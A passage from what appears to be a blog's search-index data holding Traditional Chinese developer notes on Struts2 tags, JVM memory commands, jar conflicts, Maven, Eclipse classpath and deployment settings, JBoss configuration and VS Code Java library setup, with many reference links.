我遇到的問題</h2><p><code>&lt;s:if test=&quot;&quot;&gt;</code> 要怎麼判斷 <code>&lt;s:property value=&quot;msg&quot;&gt;</code> 呢?</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;s:if test=&apos;messageStore == &quot;Hello Struts User (from toString)&quot;&apos;&gt;</span><br><span class=\"line\">123456789</span><br><span class=\"line\">&lt;/s:if&gt;</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://silver8250.blogspot.com/2009/05/struts2-struts2-data-tags.html\" target=\"_blank\" rel=\"noopener\">阿信 (Silver8250) 的冷泡咖啡館~: [Struts2] Struts2 Data Tags</a></p>\n<p><a href=\"https://blog.csdn.net/qq30211478/article/details/77188991\" target=\"_blank\" rel=\"noopener\">EL、OGNL、JSTL和struts标签的区别_数据库_qq30211478的博客-CSDN博客</a></p>\n<p><a href=\"https://blog.csdn.net/u010735684/article/details/51374484\" target=\"_blank\" rel=\"noopener\">C标签和s标签的对比，特别是里面的if判断条件的写法<em>java</em>寂寞是一个人的狂欢，狂欢是一群人的寂寞…-CSDN博客</a><br><a href=\"https://www.cnblogs.com/beijingstruggle/p/5855043.html\" target=\"_blank\" rel=\"noopener\">jsp中c:if与s:if的区别 - struggle_beiJing - 博客园</a></p>\n","categories":["Java"],"tags":["jstl","ongl","el"]},{"title":"JVM 查看記憶體使用情況方法","url":"/blog/2021/01/04/JVM-%E6%9F%A5%E7%9C%8B%E8%A8%98%E6%86%B6%E9%AB%94%E4%BD%BF%E7%94%A8%E6%83%85%E6%B3%81%E6%96%B9%E6%B3%95/","content":"<a id=\"more\"></a>\n<h2 id=\"使用清單\"><a href=\"#使用清單\" class=\"headerlink\" title=\"使用清單\"></a>使用清單</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#  檢視當前機器上所有執行的java程序名稱與pid(程序編號)</span></span><br><span class=\"line\">jps -l</span><br><span class=\"line\"><span class=\"comment\">#  顯示指定的jvm程序所有的屬性設定和配置引數</span></span><br><span class=\"line\">jinfo pid</span><br></pre></td></tr></table></figure>\n<p>TODO: 整理</p>\n<p><a href=\"https://my.oschina.net/u/4416802/blog/3845052\" target=\"_blank\" rel=\"noopener\">利用jmap和MAT等工具查看JVM运行时堆内存 - osc_3wmngxzc的个人空间 - OSCHINA - 中文开源技术交流社区</a><br><a href=\"https://blog.yosheng.tw/jvm-out-of-memory\" target=\"_blank\" rel=\"noopener\">JVM 記憶體溢出 - 夜升筆談</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1518274\" target=\"_blank\" rel=\"noopener\">JVM故障分析及性能优化实战(VII)——使用MAT的Histogram和Dominator Tree定位溢出源 - 云+社区 - 腾讯云</a></p>\n<p><a href=\"https://codingnote.cc/zh-tw/p/152324/\" target=\"_blank\" rel=\"noopener\">JVM(完成度95%,不斷更新) - ⎝⎛CodingNote.cc ⎞⎠</a></p>\n<p><a href=\"https://www.itread01.com/p/580598.html\" target=\"_blank\" rel=\"noopener\">JVM引數對J2EE效能優化的影響 - IT閱讀</a></p>\n","categories":["Java"],"tags":["jvm"]},{"title":"Java / Jboss 小記","url":"/blog/2020/03/10/Java-Tomcat-%E5%B0%8F%E8%A8%98/","content":"<p>TODO: 尚未整理完成</p>\n<p>最近工作需求，需要使用 Java<br>這邊做一些有關 Java 雜記</p>\n<a id=\"more\"></a>\n<p>常常我們配置 Eclipse 都沒有想過 Java 運作原理<br>藉著 GUI 操作我們也不知道它底下是怎麼跑的<br>雖然大學有玩過用 <code>java -cp xxxx</code> 來編譯一些程式<br><a href=\"https://malagege.github.io/blog/2018/08/27/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/\">go安裝筆記&amp;gopath環境變數設定 | 程式狂想筆記</a><br>對 classpath 只能說編譯時候可以用別的 lib(或別的class) 搭配使用<br>不過我發現用 Eclipse 我不知道他是怎麼執行<br>今天主要好好研究</p>\n<h2 id=\"Java\"><a href=\"#Java\" class=\"headerlink\" title=\"Java\"></a>Java</h2><h3 id=\"Java-Jar-檔案衝突\"><a href=\"#Java-Jar-檔案衝突\" class=\"headerlink\" title=\"Java Jar 檔案衝突\"></a>Java Jar 檔案衝突</h3><p><a href=\"http://littleblack.online/?thread-31.htm\" target=\"_blank\" rel=\"noopener\">【经验总结】Java利用iText实现PDF操作-技术-LittleblackOnline</a></p>\n<p>最近公司 jasperreport 和 itextpdf 衝突<br>為了做 pdfwriter 做 setEncryption </p>\n<blockquote>\n<p>PdfWriter.ENCRYPTION_AES_128<br>允許列印,編輯，複製，簽名 加密級別：128-bit-AES<br>PdfWriter.STANDARD_ENCRYPTION_128<br>允許列印,編輯，複製，簽名 加密級別：128-bit-RC4</p>\n</blockquote>\n<p><a href=\"https://www.itread01.com/content/1541909906.html\" target=\"_blank\" rel=\"noopener\">【itext學習之路】——-（第三篇）對pdf文件進行加密和許可權設定 - IT閱讀</a><br><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/298626/\" target=\"_blank\" rel=\"noopener\">Java 動態載入jar和class檔案例項解析 | 程式前沿</a><br><a href=\"https://blog.csdn.net/myk_666888/article/details/5705208\" target=\"_blank\" rel=\"noopener\">Tomcat启动时classloader加载顺序 <em>Java</em>天乙贵人-CSDN博客</a><br><a href=\"https://blog.csdn.net/Peter_K/article/details/1667674\" target=\"_blank\" rel=\"noopener\">ClassLoader解决jar包冲突问题_JavaScript_Peter_K的专栏-CSDN博客</a><br><a href=\"https://learnku.com/php/t/7609/you-have-to-know-17-composer-best-practices-updated-to-22\" target=\"_blank\" rel=\"noopener\">你必须知道的 17 个 Composer 最佳实践（已更新至 22 个） | PHP 技术论坛</a></p>\n<p>但會遇到</p>\n<blockquote>\n<p>java.lang.ClassNotFoundException: org.bouncycastle.asn1.DEREncodable</p>\n</blockquote>\n<p>但用另一個 jar ，jasperreport 就會有衝突</p>\n<p>簡單尋找衝突方式<br>看 Maven 對應版本(Compile Dependencies )<br><a href=\"https://mvnrepository.com/artifact/net.sf.jasperreports/jasperreports/6.1.0\" target=\"_blank\" rel=\"noopener\"> jasperreports » 6.1.0</a>→<a href=\"https://mvnrepository.com/artifact/com.lowagie/itext/2.1.7\" target=\"_blank\" rel=\"noopener\"> itext » 2.1.7</a>→<a href=\"https://mvnrepository.com/artifact/bouncycastle/bcprov-jdk14/138\" target=\"_blank\" rel=\"noopener\">bcprov-jdk15on 138</a><br><a href=\"https://mvnrepository.com/artifact/com.itextpdf/itextpdf/5.5.5\" target=\"_blank\" rel=\"noopener\">itextpdf » 5.5.5</a>→<a href=\"https://mvnrepository.com/artifact/org.bouncycastle/bcprov-jdk15on/1.49\" target=\"_blank\" rel=\"noopener\">bcprov-jdk15on 1.49</a></p>\n<p>依照 classpath 規則，正常 jar 檔相同 namespace 只會吃到第一個，之後讀到都會被忽略<br>正常解法應該要用對應版本，可以以框架為主，通常搭配的 jar 應該使用對應相同的版本會比較好</p>\n<p>當然也有找到下面方法，但我覺得不是最好的做法<br><a href=\"https://blog.csdn.net/Memery_last/article/details/83830475\" target=\"_blank\" rel=\"noopener\">classloader解决jar冲突隔离<em>Java</em>到西伯利亚浪-CSDN博客</a></p>\n<h2 id=\"使用-Maven\"><a href=\"#使用-Maven\" class=\"headerlink\" title=\"使用 Maven\"></a>使用 Maven</h2><p>之前也有使用 Maven 但也不是很了解<br><a href=\"https://kentyeh.github.io/mavenStartup/index.html\" target=\"_blank\" rel=\"noopener\">Mave教學 | Maven 初學者中文教程</a><br>但我這邊發現所有的套件都會在<code>~/.m2</code></p>\n<p>也就是說，所有的 Project 都是吃一樣的 jar 檔案<br>這邊真的還滿奇特</p>\n<p>不知道他 javac 是怎麼加檔案進去</p>\n<p><a href=\"https://www.jianshu.com/p/86694b6fd29c\" target=\"_blank\" rel=\"noopener\">javac、classpath的编译和生成Maven工程 - 简书</a> <a href=\"/blog/2020/03/10/Java-Tomcat-小記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<p>看上面這篇 classpath 可以放 Project 資料夾路徑沒編譯的 java? 有待確認…，不過應該沒錯</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/65388744\" target=\"_blank\" rel=\"noopener\">Java包管理的那些事4——Maven - 知乎</a><br><a href=\"https://kknews.cc/zh-tw/code/nkqnleq.html\" target=\"_blank\" rel=\"noopener\">開發中：給大家一份Maven知識整理，希望有所幫助 - 每日頭條</a></p>\n<p>因為目前公司碰的專案沒有用到 Maven和 Gradle<br>有機會接觸再補充</p>\n<p><a href=\"https://www.itread01.com/content/1545095402.html\" target=\"_blank\" rel=\"noopener\">專案自動構建工具對比(Maven、Gradle、Ant) - IT閱讀</a><br><a href=\"https://blog.xuite.net/mistech/blog/211079202-Maven+%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E8%88%87%E5%9C%A8+eclipse+%E5%B0%88%E6%A1%88%E5%AF%A6%E4%BD%9C\" target=\"_blank\" rel=\"noopener\">Maven 的基本概念與在 eclipse 專案實作 @ MISTECH 技術手抄本 :: 隨意窩 Xuite日誌</a></p>\n<p><a href=\"https://www.jianshu.com/p/a2cf2336a48c\" target=\"_blank\" rel=\"noopener\">SpringBoot加载外部依赖 - 简书</a><br><a href=\"http://www.huangbowen.net/blog/2016/02/23/gradle-vs-maven/\" target=\"_blank\" rel=\"noopener\">Maven和Gradle对比 - 黄博文的地盘</a><br><a href=\"http://allenwu.logdown.com/posts/4878611-eclipse-wtp-deployment-assembly\" target=\"_blank\" rel=\"noopener\">Eclipse wtp Deployment Assembly « Allen’s Blog</a></p>\n<h2 id=\"Eclipse-相關環境設定的影響\"><a href=\"#Eclipse-相關環境設定的影響\" class=\"headerlink\" title=\"Eclipse 相關環境設定的影響\"></a>Eclipse 相關環境設定的影響</h2><p><a href=\"https://tomkuo139.blogspot.com/2012/01/eclipse-project-facet.html\" target=\"_blank\" rel=\"noopener\">昭佑.天翔: Eclipse Project Facet 功能</a><br><a href=\"https://www.itread01.com/content/1514264308.html\" target=\"_blank\" rel=\"noopener\">Eclipse Build Path 的理解 - IT閱讀</a></p>\n<h2 id=\"部屬-java\"><a href=\"#部屬-java\" class=\"headerlink\" title=\"部屬 java\"></a>部屬 java</h2><p><a href=\"https://blog.csdn.net/weixin_43112000/article/details/84032214\" target=\"_blank\" rel=\"noopener\">Jenkins入门(一)_运维_weixin_43112000的博客-CSDN博客</a><br><a href=\"https://blog.csdn.net/weixin_43112000/article/details/96858469\" target=\"_blank\" rel=\"noopener\">Jenkins+Java+Maven+不中断服务+自动化部署+失败自动回滚_Java_weixin_43112000的博客-CSDN博客</a><br><a href=\"https://www.dazhuanlan.com/2019/09/25/5d8a43a62f610/\" target=\"_blank\" rel=\"noopener\">基于Jenkins的JAVA持续部署环境搭建 | 大专栏</a></p>\n<h2 id=\"Jboss\"><a href=\"#Jboss\" class=\"headerlink\" title=\"Jboss\"></a>Jboss</h2><p>記得要設定 JBOSS_HOME<br>JBOSS_HOME = C:\\jboss-4.0.3SP1</p>\n<h3 id=\"jsp-熱加載\"><a href=\"#jsp-熱加載\" class=\"headerlink\" title=\"jsp 熱加載\"></a>jsp 熱加載</h3><p>jboss-eap-7.1\\standalone\\configuration\\standalone.xml  裡面 <jsp-config>改成<jsp-config development=\"true\">  就能不用重啟jsp了</jsp-config></jsp-config></p>\n<h3 id=\"jboss-使用-eclipse-沒有-log\"><a href=\"#jboss-使用-eclipse-沒有-log\" class=\"headerlink\" title=\"jboss 使用 eclipse 沒有 log\"></a>jboss 使用 eclipse 沒有 log</h3><p>移除 Server 我發現 log 消失了<br>後來突然想到有 JBoss EAP Server 點兩下，選擇 Open Launch configuration ，然後在 VM arguments 裡最後加入 -Dorg.jboss.as.logging.per-deployment=false </p>\n<p>參考:<a href=\"https://mistech.pixnet.net/blog/post/393201464-jboss-eap-6.x-%E5%B0%8D%E6%96%BC-log4j-%26-system.out-%E5%9C%A8-eclipse-%E4%B8%8A-cons\" target=\"_blank\" rel=\"noopener\">JBoss EAP 6.x 對於 Log4j &amp; System.out 在 Eclipse 上 Console 顯示設定 @ MISTECH 技術手抄本 :: 痞客邦 ::</a></p>\n<h3 id=\"java-熱加載\"><a href=\"#java-熱加載\" class=\"headerlink\" title=\"java 熱加載\"></a>java 熱加載</h3><p>使用 debug 模式就能做到熱加載</p>\n<h3 id=\"Eclipse-的-classpath-project-settings\"><a href=\"#Eclipse-的-classpath-project-settings\" class=\"headerlink\" title=\"Eclipse 的 .classpath .project .settings\"></a>Eclipse 的 .classpath .project .settings</h3><blockquote>\n<p>從數據上我們容易看出，上面描述了工程的依賴文件：</p>\n<p>源文件的具體位置（kind=”src”）<br>運行的系統環境（kind=”con”）<br>工程的library的具體位置信息(kind=”lib”)<br>在每個lib的xml子節點中，有關於它的其它配置信息（例如我配置的那個”javadoc_location”）<br>項目的輸出目錄(kind=”output”)<br>總體上說這個文件就是配置整個工程的運行環境。</p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/qq_35792598/article/details/76573943\" target=\"_blank\" rel=\"noopener\">eclipse项目中的.settings .project .classpath 个人见解<em>开发工具</em>只在朝暮间的博客-CSDN博客</a><br><a href=\"https://segmentfault.com/a/1190000007721071\" target=\"_blank\" rel=\"noopener\">除了Maven，还有一种解决jar包管理及定制的好方法 - Java开发分享 - SegmentFault 思否</a></p>\n<h3 id=\"Tomcat-一些事情\"><a href=\"#Tomcat-一些事情\" class=\"headerlink\" title=\"Tomcat 一些事情\"></a>Tomcat 一些事情</h3><p><a href=\"https://blog.csdn.net/andyelvis/article/details/6719996\" target=\"_blank\" rel=\"noopener\">理解Tomcat的Classpath-常见问题以及如何解决_Java_AndyElvis的专栏-CSDN博客</a></p>\n<h2 id=\"struct2\"><a href=\"#struct2\" class=\"headerlink\" title=\"struct2\"></a>struct2</h2><p>這邊簡單小記，有空再補</p>\n<p>action </p>\n<p>spa!xxx<br>spa 找 xml 對照的 java<br>xxx 是 method<br>沒寫 xxx 預設是 execute</p>\n<p>頁面傳到 jsp 會做 setXXXX,getXXX</p>\n<h2 id=\"struct2-和-spring\"><a href=\"#struct2-和-spring\" class=\"headerlink\" title=\"struct2 和 spring\"></a>struct2 和 spring</h2><p><a href=\"https://www.w3cschool.cn/struts_2/struts_spring.html\" target=\"_blank\" rel=\"noopener\">Struts2 Spring集成_w3cschool</a></p>\n<h2 id=\"Eclipse-修改檔案不用重啟-Server\"><a href=\"#Eclipse-修改檔案不用重啟-Server\" class=\"headerlink\" title=\"Eclipse 修改檔案不用重啟 Server\"></a>Eclipse 修改檔案不用重啟 Server</h2><p><a href=\"https://blog.csdn.net/xingsfdz/article/details/80665896\" target=\"_blank\" rel=\"noopener\">eclipse配置修改代码不用重启<em>开发工具</em>小白菜-CSDN博客</a><br><a href=\"https://www.itread01.com/content/1542335343.html\" target=\"_blank\" rel=\"noopener\">Eclipse 修改方法裡面的內容不用重啟專案 - IT閱讀</a></p>\n<p><a href=\"https://www.itdaan.com/tw/191c35d4309929e8a8154a0d6553bce2\" target=\"_blank\" rel=\"noopener\">jboss + eclipse 如何設置才能不重啟服務就能自動編譯jsp - 开发者知识库</a><br><a href=\"https://taiwanjava.blogspot.com/2016/04/jboss-jsp-servers.html\" target=\"_blank\" rel=\"noopener\">Java碼農清單: jboss 修改jsp ,不須重啟servers伺服器</a></p>\n<p><a href=\"https://tpu.thinkpower.com.tw/tpu/articleDetails/557\" target=\"_blank\" rel=\"noopener\">https://tpu.thinkpower.com.tw/tpu/articleDetails/557</a></p>\n<h2 id=\"Eclipse-Project-clean\"><a href=\"#Eclipse-Project-clean\" class=\"headerlink\" title=\"Eclipse Project clean\"></a>Eclipse Project clean</h2><p>以前開發經驗都知道 Project 執行有問題<br>只需要按 Project → clean<br>有找到他是清除 class 文件</p>\n<blockquote>\n<p>所以有些時候編譯不通過原因是沒有project-&gt;clean造成的！！！<br>eclipse &gt; project &gt; clean 是把 eclipse 編譯生成的 class 之類的文件刪除，以便以後再次編譯。 redeploy 是指把 web 重新部署到 tomcat， 這可能會把 jsp/html/css/js 之類的文件及 WEB-INF 目錄複製到 tomcat 或者是把整個項目導致成一個 war 複製到 tomcat。<br><a href=\"https://www.cnblogs.com/panxuejun/p/6180324.html\" target=\"_blank\" rel=\"noopener\">eclipse中project-&gt;clean的作用是什么 - THISISPAN - 博客园</a></p>\n</blockquote>\n<blockquote>\n<p>在eclipse中写JavaWeb项目时，有时候会出现代码修改了，但是执行的效果还是修改之前的，这时候clean一下就会解决问题</p>\n<p>1.clean操作</p>\n<p>Project—-&gt;clean—&gt;选择需要clean的项目</p>\n<p><img src=\"https://i.imgur.com/81UjZvs.png\" alt=\"\"></p>\n<p>2.clean原理</p>\n<p>eclipse为了提高效率，并不是每次启动项目都会检查插件，通过clean就是强制eclipse去检查已安装插件。<br>我们都知道.java文件是通过编译成.class文件运行的，而clean后会删除已经编译生成的.class文件并重新部署项目。<br>总起来将就是强制检查已安装插件，清除以前编译的信息，重新部署项目。</p>\n<p>3.clean后无法正常运行</p>\n<p><img src=\"https://i.imgur.com/PFJYmNX.jpg\" alt=\"\"></p>\n<p>右键项目—-&gt;properties如图，去掉Abort build when build path errors occur<br><a href=\"https://www.debugger.wiki/article/html/1562671380956639\" target=\"_blank\" rel=\"noopener\">eclipse中的clean操作 - debugger.wiki - debugger.wiki</a></p>\n</blockquote>\n<p> 發現還有 Deployment Assembly<br> java Build path是編譯路徑設置,主要用來設置源代碼的編譯路徑默認是default output folder</p>\n<blockquote>\n<p><img src=\"https://i.imgur.com/o8Y3mbk.png\" alt=\"\"><br>Web Deployment Assembly是eclipse中的發布路徑設置，DeployPath表示每個資源發佈之後的文件路徑<br><img src=\"https://i.imgur.com/zEmk1Tf.png\" alt=\"\"></p>\n<p>理解</p>\n<p>eclipse中使用tomcat使用啟動web項目的流程是 java build path編譯項目源代碼生成的class文件放到buildpath的設置路徑中，根據web deployment assembly將項目中的各個資源發佈到設置的指定文件中<br><a href=\"https://blog.csdn.net/shiwodecuo/article/details/62040447\" target=\"_blank\" rel=\"noopener\">eclipse中Deployment Assembly选项设置说明<em>开发工具</em>我的世界，真实可见 -CSDN博客</a></p>\n</blockquote>\n<p>這樣我就突然想到之前專案設錯 Deployment Assembly 就不能執行<br>不是 Web 專案是沒有 Deployment Assembly </p>\n<h3 id=\"eclipse-設定編譯出位置-class-path\"><a href=\"#eclipse-設定編譯出位置-class-path\" class=\"headerlink\" title=\"eclipse 設定編譯出位置 .class path\"></a>eclipse 設定編譯出位置 .class path</h3><p>應該是相同路徑<br>主要看.classpath<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;classpathentry kind=&quot;src&quot; path=&quot;src&quot;/&gt;</span><br></pre></td></tr></table></figure></p>\n<p>其他相關<br><a href=\"https://stackoverflow.com/questions/17161237/path-to-class-file-in-eclipse\" target=\"_blank\" rel=\"noopener\">Path to .class file in eclipse - Stack Overflow</a><br><a href=\"http://jason79-blog.logdown.com/posts/256196-in-eclipse-using-gradle-to-modify-default-output-folder\" target=\"_blank\" rel=\"noopener\">在eclipse中使用Gradle之修改default output folder « Jason’s Blog</a></p>\n<h4 id=\"Eclipse-看-Properties-會亂碼\"><a href=\"#Eclipse-看-Properties-會亂碼\" class=\"headerlink\" title=\"Eclipse 看 Properties 會亂碼\"></a>Eclipse 看 Properties 會亂碼</h4><p>安裝 PropertiesEditor 就能正常<br>可參考下面連結<br><a href=\"https://coffee0127.github.io/blog/2016/08/15/eclipse-poperties/\" target=\"_blank\" rel=\"noopener\">Eclipse Properties 顯示中文字 | Xuan’s Blog</a><br><a href=\"https://blog.csdn.net/mukvintt/article/details/79746857\" target=\"_blank\" rel=\"noopener\">eclipse中 XXXX.properties文件 不显示中文，显示的unicode编码。_开发工具_mukvintt的博客-CSDN博客</a></p>\n<h4 id=\"Eclipse-實用快速鍵\"><a href=\"#Eclipse-實用快速鍵\" class=\"headerlink\" title=\"Eclipse 實用快速鍵\"></a>Eclipse 實用快速鍵</h4><blockquote>\n<p>重構<br><code>Alt+Shift+R</code>: 重命名 (是我自己最愛用的一個了,尤其是變量和類的Rename,比手工方法能節省很多勞動力)<br><code>Alt+Shift+M</code>: 抽取方法 (這是重構裡面最常用的方法之一了,尤其是對一大堆泥團代碼有用)<br><code>Alt+Shift+C</code>: 修改函數結構(比較實用,有N個函數調用了這個方法,修改一次搞定)<br><code>Alt+Shift+L</code>: 抽取本地變量( 可以直接把一些魔法數字和字符串抽取成一個變量,尤其是多處調用的時候)<br><code>Alt+Shift+F</code>: 把Class中的local變量變為field變量 (比較實用的功能)<br><code>Alt+Shift+I</code>: 合併變量(可能這樣說有點不妥Inline)<br><code>Alt+Shift+V</code>: 移動函數和變量(不怎麼常用)<br><code>Alt+Shift+Z</code>: 重構的後悔藥(Undo)</p>\n</blockquote>\n<p>參考: <a href=\"https://wsxq2.55555.io/blog/2018/12/12/eclipse%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/\" target=\"_blank\" rel=\"noopener\">Eclipse使用技巧</a></p>\n<h2 id=\"vscode-使用-web-方案\"><a href=\"#vscode-使用-web-方案\" class=\"headerlink\" title=\"vscode 使用 web 方案\"></a>vscode 使用 web 方案</h2><h3 id=\"先說明我目前用到的專案\"><a href=\"#先說明我目前用到的專案\" class=\"headerlink\" title=\"先說明我目前用到的專案\"></a>先說明我目前用到的專案</h3><p>.classpath 底下有設定這些<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?</span>xml version=<span class=\"string\">\"1.0\"</span> encoding=<span class=\"string\">\"UTF-8\"</span><span class=\"meta\">?&gt;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">classpath</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"src\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"src\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"con\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"org.eclipse.jst.j2ee.internal.web.container\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"con\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"org.eclipse.jst.j2ee.internal.module.container\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">combineaccessrules</span>=<span class=\"string\">\"false\"</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"src\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"/xxxx-common\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">combineaccessrules</span>=<span class=\"string\">\"false\"</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"src\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"/xxx-sms\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"con\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"org.eclipse.jst.server.core.container/org.jboss.ide.eclipse.as.core.server.runtime.runtimeTarget/JBoss EAP 7.1 Runtime\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">combineaccessrules</span>=<span class=\"string\">\"false\"</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"src\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"/xxxx-pdf\"</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"con\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8\"</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">attributes</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">attribute</span> <span class=\"attr\">name</span>=<span class=\"string\">\"owner.project.facets\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"java\"</span>/&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">attributes</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">classpathentry</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"output\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"build/classes\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">classpath</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>看到 add classpath 有設定一些專案旁的 Project<br>vscode 吃的到 .classpath 檔案<br>但 vscode 單讀開 Project 不會吃到的樣子<br>有找到下面的方法 java.project.referencedLibraries<br>但還是沒用</p>\n<h3 id=\"vscode-載入-jar-檔方法\"><a href=\"#vscode-載入-jar-檔方法\" class=\"headerlink\" title=\"vscode 載入 jar 檔方法\"></a>vscode 載入 jar 檔方法</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;java.project.referencedLibraries&quot;: &#123;</span><br><span class=\"line\">    &quot;include&quot;: [</span><br><span class=\"line\">        &quot;library/**/*.jar&quot;,</span><br><span class=\"line\">        &quot;/home/username/lib/foo.jar&quot;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    &quot;exclude&quot;: [</span><br><span class=\"line\">        &quot;library/sources/**&quot;</span><br><span class=\"line\">    ],</span><br><span class=\"line\">    &quot;sources&quot;: &#123;</span><br><span class=\"line\">        &quot;library/bar.jar&quot;: &quot;library/sources/bar-src.jar&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://code.visualstudio.com/docs/java/java-project\" target=\"_blank\" rel=\"noopener\">Maven Support, Java Package, and Dependency Management in Visual Studio Code</a></p>\n<p>In case VS Code throws an error for a classpath issue, try setting your classpath manually by either setting the CLASSPATH environment variable or editing the .classpath file with the path to the JAR file:</p>\n<p>看樣子 maven 不能設定 classpath</p>\n<p>相關連結<br><a href=\"https://blog.csdn.net/rogerjava/article/details/23764679\" target=\"_blank\" rel=\"noopener\">Maven管理的jar没有发布到WEB-INF/lib下的解决方案_java的涟漪-CSDN博客</a><br><a href=\"https://zhuanlan.zhihu.com/p/68065612\" target=\"_blank\" rel=\"noopener\">（三）Java资源文件和路径相关扫盲 - 知乎</a><br><a href=\"https://www.jianshu.com/p/7cadd9bedf4f\" target=\"_blank\" rel=\"noopener\">java项目中的classpath到底是什么 - 简书</a><br><a href=\"https://stackoverflow.com/questions/364114/can-i-add-jars-to-maven-2-build-classpath-without-installing-them\" target=\"_blank\" rel=\"noopener\">java - Can I add jars to maven 2 build classpath without installing them? - Stack Overflow</a></p>\n<p>沒法對 Project 做<br>但這個對我的專案沒什麼用</p>\n<h3 id=\"vsocde-對整個-workspace-開啟\"><a href=\"#vsocde-對整個-workspace-開啟\" class=\"headerlink\" title=\"vsocde 對整個 workspace 開啟\"></a>vsocde 對整個 workspace 開啟</h3><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">classpathentry</span> <span class=\"attr\">combineaccessrules</span>=<span class=\"string\">\"false\"</span> <span class=\"attr\">kind</span>=<span class=\"string\">\"src\"</span> <span class=\"attr\">path</span>=<span class=\"string\">\"/xxxx-common\"</span>/&gt;</span></span><br></pre></td></tr></table></figure>\n<p>發現對整個 workspace 開啟<br>程式就可以關連到 Project 程式<br>手動加真的太慢了<br>用 Eclipse 做設定會寫到 .classpath 檔案<br>缺點還是需要手動加</p>\n<img src=\"/blog/2020/03/10/Java-Tomcat-小記/add_jar.png\" title=\"Eclipse加jar檔\">\n<p>這個方法是參考<a href=\"https://min9nim.github.io/2018/05/vscode-setting/\" target=\"_blank\" rel=\"noopener\">[vscode] java 사용시 세팅 관련</a><br>原本我是想用 <code>*</code> 加入 jar 檔案<br>但這邊說不能這樣設定<br>使用單筆 jar 進去 vsocde就能順利認得 class</p>\n<p>題外話<br>小記 Classpath 加 Project 時候<br>發步 JBOSS 時候 WEB-INF/lib/裡面會加入到剛剛加的 Project WAR 檔</p>\n<h3 id=\"add-project-classpath\"><a href=\"#add-project-classpath\" class=\"headerlink\" title=\"add project(classpath)\"></a>add project(classpath)</h3><p>A Project 包 jar 檔時候，被 B Project 引入時候，我發現 A project </p>\n<p><a href=\"https://sites.google.com/site/waue0920/Home/java/java-de-da-bao-chengjar-fang-fa#%E6%89%93%E5%8C%85%E6%88%90exe%E6%AA%94%E5%B7%A5%E5%85%B7\" target=\"_blank\" rel=\"noopener\">java的打包成jar方法 - 學而時習之</a></p>\n<p><a href=\"https://www.jianshu.com/p/658ebd054fba\" target=\"_blank\" rel=\"noopener\">intellij与eclipse默认快捷键对比 - 简书</a><br><a 